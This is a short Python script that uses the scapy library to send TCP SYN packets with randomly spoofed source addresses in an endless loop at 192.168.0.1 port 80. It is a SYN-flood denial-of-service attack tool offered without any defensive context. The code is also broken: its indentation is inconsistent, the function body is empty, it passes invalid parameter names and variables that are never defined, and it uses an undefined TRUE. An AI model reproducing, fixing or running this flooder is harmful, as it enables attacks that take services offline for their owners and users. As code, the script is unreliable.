from scapy.all import *
def tcp_syn(IP_ADDRESS,SPORT,DPORT):
	

s_addr = RandIP()
d_addr = IP_ADDRESS

	packet = IP(src=s_addr,dst=d_addr)/TCP(SPORT=sport,DPORT=dport,seq=1505066,flags="S")
	send(packet)

    while(TRUE):
	tcp_syn("192.168.0.1",80,80)
